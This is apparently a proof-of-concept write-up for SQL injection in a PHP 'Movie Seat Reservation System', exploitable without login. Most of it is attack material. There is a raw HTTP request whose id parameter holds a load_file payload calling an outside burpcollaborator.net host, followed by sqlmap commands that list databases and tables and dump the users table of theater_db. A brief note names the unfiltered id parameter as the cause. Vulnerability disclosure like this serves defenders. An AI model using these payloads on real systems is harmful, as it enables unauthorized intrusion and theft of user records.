# Movie Seat Reservation System Sql Injection
* `Note` => exploit don't need login account
# Exploit 
* Use Burp Suite capture request with payload
![image](https://user-images.githubusercontent.com/79050415/160153517-9ff10b72-e677-428d-b92b-9588f9e0bda7.png)

```python
GET /Movie_Seat_Reservation_System/index.php?page=reserve&id=(select%20load_file('%5c%5c%5c%5coumvuo0qifuf18d8xd3vrtn81z7svqjhl5cs3gs.burpcollaborator.net%5c%5cbxr')) HTTP/1.1
Host: 192.168.1.101:8080
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
Then save as `moviesqli.txt`
* Exploit with `Sqlmap`
```python
python3 sqlmap.py -r moviesqli.txt --current-user
```
![image](https://user-images.githubusercontent.com/79050415/160154272-be4be6b5-64a1-495c-937e-65f50c2de43d.png)

```python
python3 sqlmap.py -r moviesqli.txt  --batch -dbs
```
![image](https://user-images.githubusercontent.com/79050415/160154484-41d6fc43-fd58-4180-9b60-440a554befc4.png)

```python3 
python3 sqlmap.py -r moviesqli.txt  --batch -tables -D theater_db
```
![image](https://user-images.githubusercontent.com/79050415/160154696-86ce3ceb-c2f3-4d58-b095-afd061e89ad3.png)

```python3 
python3 sqlmap.py -r moviesqli.txt  --batch -columns -D theater_db -T users -dump
```
![image](https://user-images.githubusercontent.com/79050415/160154865-82a9b67a-e37d-4cb1-aad2-76df5a18c5f5.png)

# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/160155334-4b64f616-2719-4e99-a8e0-dcbec0d42ea1.png)

* No filter `id` when inserting data to database





